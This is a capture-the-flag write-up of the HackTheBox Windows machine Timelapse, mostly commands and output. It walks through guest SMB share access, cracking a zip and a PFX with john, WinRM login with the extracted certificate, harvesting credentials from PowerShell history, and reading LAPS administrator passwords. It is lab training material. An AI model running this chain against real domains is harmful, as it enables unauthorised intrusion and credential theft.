# CTF Penetration Testing

## Platform: HackTheBox

### Machine: [Timelapse](https://www.hackthebox.com/machines/Timelapse)

<img src="https://labs.hackthebox.com/storage/avatars/bae443f73a706fc8eebc6fb740128295.png" alt="Timelapse Machine Logo" width="150"/>

- Machine type: <img src="https://hackmyvm.eu/img/windows.png" alt="Windows" width="17"/> Windows
- Machine difficulty: 🟩 Easy (4.0)

> **Timelapse** is an Easy Windows machine, which involves accessing a publicly accessible SMB share that contains a zip file. This zip file requires a password which can be cracked by using John. Extracting the zip file outputs a password encrypted PFX file, which can be cracked with John as well, by converting the PFX file to a hash format readable by John. From the PFX file an SSL certificate and a private key can be extracted, which is used to login to the system over WinRM. After authentication we discover a PowerShell history file containing login credentials for the `svc_deploy` user. User enumeration shows that `svc_deploy` is part of a group named `LAPS_Readers`. The `LAPS_Readers` group has the ability to manage passwords in LAPS and any user in this group can read the local passwords for machines in the domain. By abusing this trust we retrieve the password for the `Administrator` and gain a WinRM session.

#### Skills Learned

- **Public SMB Share**
- **Credentials Harvesting**
- **Cracking Protected Files**
- **LAPS Privilege Escalation**

#### Tools Used

Linux:
- `nmap`
- `netexec`
- `impacket-smbclient`
- `zip2john`
- `pfx2john`
- `john`
- `evil-winrm`
- `openssl`
Windows:
- `net.exe`

#### Machine Writeup

```
┌──(nabla㉿kali)-[~]
└─$ ifconfig tun0

tun0: flags=4305<UP,POINTOPOINT,RUNNING,NOARP,MULTICAST>  mtu 1500
        inet 10.10.14.144  netmask 255.255.254.0  destination 10.10.14.144

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '10.129.227.113\ttimelapse.htb' | sudo tee -a /etc/hosts

10.129.227.113	timelapse.htb
```

```
┌──(nabla㉿kali)-[~]
└─$ ports=$(nmap -p- timelapse.htb -T4 --min-rate=1000 | grep '^[0-9]' | cut -d '/' -f 1 | tr '\n' ',' | sed s/,$//)
```

```
┌──(nabla㉿kali)-[~]
└─$ echo $ports

53,88,135,139,389,445,593,636,3268,3269,5986,9389,49667,49677,49678,49699,61352
```

```
┌──(nabla㉿kali)-[~]
└─$ nmap -Pn -p$ports -sSV timelapse.htb -T4

[SNIP]

PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2025-07-01 02:04:05Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: timelapse.htb0., Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
5986/tcp  open  ssl/http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49677/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49678/tcp open  msrpc             Microsoft Windows RPC
49699/tcp open  msrpc             Microsoft Windows RPC
61352/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb timelapse.htb

SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
```

```
┌──(nabla㉿kali)-[~]
└─$ echo -e '10.129.227.113\tDC01.timelapse.htb' | sudo tee -a /etc/hosts

10.129.227.113	DC01.timelapse.htb
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb timelapse.htb -u 'guest' -p ''

SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\guest:
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb timelapse.htb -u 'guest' -p '' --shares

[SNIP]

SMB         10.129.227.113  445    DC01             Share           Permissions     Remark
SMB         10.129.227.113  445    DC01             -----           -----------     ------
SMB         10.129.227.113  445    DC01             ADMIN$                          Remote Admin
SMB         10.129.227.113  445    DC01             C$                              Default share
SMB         10.129.227.113  445    DC01             IPC$            READ            Remote IPC
SMB         10.129.227.113  445    DC01             NETLOGON                        Logon server share 
SMB         10.129.227.113  445    DC01             Shares          READ            
SMB         10.129.227.113  445    DC01             SYSVOL                          Logon server share 
```

**Public SMB Share**

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb timelapse.htb -u 'guest' -p '' -M spider_plus

[SNIP]

SPIDER_PLUS 10.129.227.113  445    DC01             [*] EXCLUDE_FILTER: ['print$', 'ipc$']
SPIDER_PLUS 10.129.227.113  445    DC01             [+] Saved share-file metadata to "/tmp/nxc_hosted/nxc_spider_plus/10.129.227.113.json".
SPIDER_PLUS 10.129.227.113  445    DC01             [*] SMB Shares:           6 (ADMIN$, C$, IPC$, NETLOGON, Shares, SYSVOL)
SPIDER_PLUS 10.129.227.113  445    DC01             [*] SMB Readable Shares:  2 (IPC$, Shares)
```

```
┌──(nabla㉿kali)-[~]
└─$ jq '.Shares | keys[]' /tmp/nxc_hosted/nxc_spider_plus/10.129.227.113.json

"Dev/winrm_backup.zip"
"HelpDesk/LAPS.x64.msi"
"HelpDesk/LAPS_Datasheet.docx"
"HelpDesk/LAPS_OperationsGuide.docx"
"HelpDesk/LAPS_TechnicalSpecification.docx"
```

```
┌──(nabla㉿kali)-[~]
└─$ impacket-smbclient timelapse.htb/guest@DC01.timelapse.htb -no-pass

[SNIP]

Type help for list of commands

# use Shares

# get Dev//winrm_backup.zip

# !file winrm_backup.zip

winrm_backup.zip: Zip archive data, at least v2.0 to extract, compression method=deflate
```

**Cracking Protected Files**

```
┌──(nabla㉿kali)-[~]
└─$ unzip winrm_backup.zip 

[winrm_backup.zip] legacyy_dev_auth.pfx password: ❌
```

```
┌──(nabla㉿kali)-[~]
└─$ zip2john winrm_backup.zip > winrm_backup.john
```

```
┌──(nabla㉿kali)-[~]
└─$ john winrm_backup.john -wordlist:/usr/share/wordlists/rockyou.txt

[SNIP]

supremelegacy    (winrm_backup.zip/legacyy_dev_auth.pfx) 
```

```
┌──(nabla㉿kali)-[~]
└─$ unzip winrm_backup.zip

[winrm_backup.zip] legacyy_dev_auth.pfx password: 
  inflating: legacyy_dev_auth.pfx
```

```
┌──(nabla㉿kali)-[~]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
```

```
┌──(nabla㉿kali)-[~]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes
Enter Import Password: ❌
```

```
┌──(nabla㉿kali)-[~]
└─$ python2 /usr/share/john/pfx2john.py legacyy_dev_auth.pfx > legacyy_dev_auth.john
```

```
┌──(nabla㉿kali)-[~]
└─$ john legacyy_dev_auth.john -wordlist:/usr/share/wordlists/rockyou.txt

[SNIP]

thuglegacy       (legacyy_dev_auth.pfx)
```

```
┌──(nabla㉿kali)-[~]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nocerts -out key.pem -nodes

Enter Import Password:
```

```
┌──(nabla㉿kali)-[~]
└─$ openssl pkcs12 -in legacyy_dev_auth.pfx -nokeys -out cert.pem

Enter Import Password:
```

```
┌──(nabla㉿kali)-[~]
└─$ openssl s_client -connect timelapse.htb:5986 -showcerts

CONNECTED(00000003)
depth=0 CN = dc01.timelapse.htb

[SNIP]
```

```
┌──(nabla㉿kali)-[~]
└─$ evil-winrm -i timelapse.htb -c cert.pem -k key.pem --ssl

[SNIP]

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\legacyy\Documents> 
```

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> type C://Users//legacyy//Desktop//user.txt

24003*************************** 🚩
```

**Credentials Harvesting**

```
*Evil-WinRM* PS C:\Users\legacyy\Documents> type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

whoami
ipconfig /all
netstat -ano |select-string LIST
$so = New-PSSessionOption -SkipCACheck -SkipCNCheck -SkipRevocationCheck
$p = ConvertTo-SecureString 'E3R$Q62^12p7PLlC%KWaxuaV' -AsPlainText -Force
$c = New-Object System.Management.Automation.PSCredential ('svc_deploy', $p)
invoke-command -computername localhost -credential $c -port 5986 -usessl -
SessionOption $so -scriptblock {whoami}
get-aduser -filter * -properties *
exit
```

```yaml
credentials:
    username: timelapse.htb/svc_deploy
    password: "E3R$Q62^12p7PLlC%KWaxuaV"
    protocol: smb,winrm
    host: DC01.timelapse.htb
    port: 445,5985
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec smb timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'

SMB         10.129.227.113  445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:timelapse.htb) (signing:True) (SMBv1:False)
SMB         10.129.227.113  445    DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
```

```
┌──(nabla㉿kali)-[~]
└─$ netexec winrm timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV'

WINRM-SSL   10.129.227.113  5986   DC01             [*] Windows 10 / Server 2019 Build 17763 (name:DC01) (domain:timelapse.htb)
WINRM-SSL   10.129.227.113  5986   DC01             [+] timelapse.htb\svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV (Pwn3d!)
```

```
┌──(nabla㉿kali)-[~]
└─$ evil-winrm -i timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' --ssl

[SNIP]

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc_deploy\Documents>
```

```
*Evil-WinRM* PS C:\Users\svc_deploy\Documents> net user svc_deploy

[SNIP]

Local Group Memberships      *Remote Management Use
Global Group memberships     *LAPS_Readers         *Domain Users
```

**LAPS Privilege Escalation**

```
┌──(nabla㉿kali)-[~]
└─$ netexec ldap timelapse.htb -u 'svc_deploy' -p 'E3R$Q62^12p7PLlC%KWaxuaV' -d timelapse.htb --module laps

[SNIP]

LAPS        10.129.227.113  389    DC01             [*] Getting LAPS Passwords
LAPS        10.129.227.113  389    DC01             Computer:DC01$ User:                Password:f4]W2[hO4z-H$1;jw]UW+@a7
```

```yaml
credentials:
    username: timelapse.htb/administrator
    password: "f4]W2[hO4z-H$1;jw]UW+@a7"
    protocol: smb,winrm
    host: DC01.timelapse.htb
    port: 445,5985
```

```
┌──(nabla㉿kali)-[~]
└─$ evil-winrm -i timelapse.htb -u administrator -p 'f4]W2[hO4z-H$1;jw]UW+@a7' --ssl

[SNIP]

Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> 
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> Get-ChildItem -Path C:\ -Filter root.txt -Recurse -ErrorAction SilentlyContinue

    Directory: C:\Users\TRX\Desktop

Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---        6/30/2025   5:58 PM             34 root.txt
```

```
*Evil-WinRM* PS C:\Users\Administrator\Documents> type C://Users//TRX//Desktop//root.txt

40b45*************************** 🚩
```

<img src="https://hackmyvm.eu/img/correctflag.png" alt="Machine Hacked!" width="150"/>

---
---
